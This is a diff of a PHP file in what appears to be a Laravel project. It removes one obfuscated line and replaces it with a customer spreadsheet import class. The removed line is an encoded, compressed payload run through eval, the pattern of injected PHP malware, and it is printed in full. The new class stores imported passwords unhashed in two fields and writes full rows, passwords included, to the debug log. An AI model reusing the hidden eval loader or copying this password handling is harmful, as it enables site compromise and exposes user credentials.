@@ -1,1 +1,65 @@
-<?php $_='c94ee842';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNrNV1uPokgUft9f4cMkTmc2WS7aO6bTD6Jys5tuUSmolwlV5YBaILO0Iv76PQXttXVmXjZZExWoOud85/adotGoP5++HT+PTRaGVKYzufnwqX6Q/TNP3743H/5onOx/bDR9ubMhyEuD0eNjs3Fc3ut7hMsmTTyJ+fba6mmcJXo+7Lnffflr9lIIoca50m+NRiVEwnx23/rGZnTFZs2HDxD7o5XTS9oxWN9RQ1/gsaZRU6NjJBdEtSW6y51eJA2Z73BroBdU3zpEcTkxHerBM7qA9dTb7eUmqLPEaLvzB04eIm/N+od1mxhbmSC+DnyX+7ojw/4NTV3qJvoiQC6n8vaZKPTv/iiTqTKNUMKLkW8vQoMrePJrPVPVLV+KPVY5hnUVI3sXin0DrxUoXg64NiQB3El75+vupsZbHGxOkB4zk/EgdTJmeNT14wX4Q0dKZw3yJUnBb4VL4SDmgDkjCRsTVWAWcXTywHd21gAwqa7IaEkl/kaNTsl6WkZ8LcdI5iR1d9bRdm7pDGzFFkb6MkTtdJp0VMAjdEZWrxs9lasf++vhXOtCnsoASVHg22XgLyPbtDcM/BbrVg9wzMV/94c10ErsuzJNWpE/4DkxvTfQH1d+GboUIDumClyj7Yb6nsC1z99Xkno56R50bvb2qenNicEXloFliKMUos7aMuQNNrx8CLhooretnltCTLK9zOyArfpunkqtHxreIiy1DM81TpCekZ4WE9MWMW1bhtcKfUeisE7mmhQa0yhQthlGbfFM4M7x6EwnYJbjEBXR67i7pBA/VLJ3vYy9nNkXNrsr2/DeAsTz4Vg7xPmjvq0+M/iOmc+gV/MgVuXLIlMBe4nHUfpuM3062s+eJm3+LrMaipqdd891GzyxetGl/swyr+yt8YqeuH9JXKhJLx327Emo8IIafI1LTcQ5wqbHLdPdWAbk2thmgaJL0Ce1/33wbd5dW6ZWQu4lX7VWVb2URcRMW8bjZXYen5Mv5IOZUPNzbc3QNn8pq9xV9sHeKvSfIyClBfDE8mMMtc7ZM1OqeOQ0xqJPacU909O8ySLOJNHf8PhG7kzgASDCAHrpVv6Our2f5vAEQ5XHk/vfzuUVW/9FPo9xmfxvcyp0mdCnEI8Kcwz2YpIAF461QnAjUzol7mkqcPLK6g8Ky3BWwGNxoAL/p89nMbP3sp4WU9VRBSarL0UVzy8y4MD2kijS6nnSrfw9x/t1Yw3sBU15Adxbc4gKfJzATBL3UDvn+915oNptarpTsSbsBIlTznxNGprA82i6Go6XNc+fYDwMZaPNGfAacCPw6GiFrsTfVnBGU0eqa5tGr5NWzd1ynuKElzAzqpq2ZSm/UtMpMfQdM+paBXxfap5lxFa28a9kT+v8TFY99tIt2T3Pndus+fM21s4C5m9GlNYl1o2oZzE3fuKnBPUhY+Ojn8zgEoOzwk/srrHyvqfsdl7nB17JidJO93r9cXGlP1kRCvmL3FAjhjPDTRnhJ8dQ17MLuapvEYOzyfKW7BxmQC5mvmfy4tJukMDMFrwgu21aYe7+9VrWfftU99oIfFNC8NUyBhHM4CTwvRzqWwnQFnigmq9V7YeKB3OV76BON7BeQN3uxDy9FkOwW8J5ZAlni4v421C/7gobevtW/AUWOEdkUM838s+Xwm6IcParOoBzSovpnYo3LnJ5wiWMPXWv9Vpdn76Koe55AmfRpQ/2aj3aGngW+ln6gpNOCXNSGvYYfkLSG3CT9ZIs72lJs6t61SMX/T4mjR3nh+DQTPDo48l7wMlRv/r//H53V705nDy7e9jvrB5+borf5p+H7ecvAe96Pp+e+e/uHv4FLhMhBA=='; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Imports;
+
+use App\Models\User;
+use App\Models\Client;
+use Illuminate\Support\Facades\Log;
+use ZipArchive;
+use Illuminate\Support\Str;
+use Maatwebsite\Excel\Concerns\ToModel;
+use Maatwebsite\Excel\Concerns\WithHeadingRow;
+
+class CustomersImport implements ToModel, WithHeadingRow
+{
+    /**
+    * @param array $row
+    *
+    * @return \Illuminate\Database\Eloquent\Model|null
+    */
+    public function model(array $row)
+    {
+        // Check if email already exists in the clients table
+        $email = $row['email'];
+        if ($email) {
+            $emailExists = User::where('email', $email)->exists();
+            if ($emailExists) {
+                Log::debug("Skipping row due to duplicate email: " . print_r($row, true));
+                return null; // Skip this record
+            }
+        }
+
+        $username = $row['username'];
+        if ($username) {
+            $usernameExists = User::where('username', $username)->exists();
+            if ($usernameExists) {
+                Log::debug("Skipping row due to duplicate username: " . print_r($row, true));
+                return null; // Skip this record
+            }
+        }
+
+        // Generate a random password with 10 characters
+        $randomPassword = Str::random(10);
+
+        // Bcrypt the current time
+        $bcryptTime = bcrypt(time());
+
+        return new Client([
+            'firstname' => $row['firstname'],
+            'lastname' => $row['lastname'],
+            'username' => $row['username'],
+            'email' => $row['email'],
+            'location' => $row['location'],
+            'latitude' => $row['latitude'],
+            'longitude' => $row['longitude'],
+            'phone' => $row['phone'],
+            'category' => $row['category'],
+            'billingType' => $row['billingType'] ?? null, // Provide a default value if the key is not present
+            'birthday' => $row['birthday'],
+            'identification' => $row['identification'],
+            'text_pass' => $row['password'],
+            'email_verified_at' => now()->format('Y-m-d H:i:s'),
+            'password' => $row['password'],
+        ]);
+    }
+}
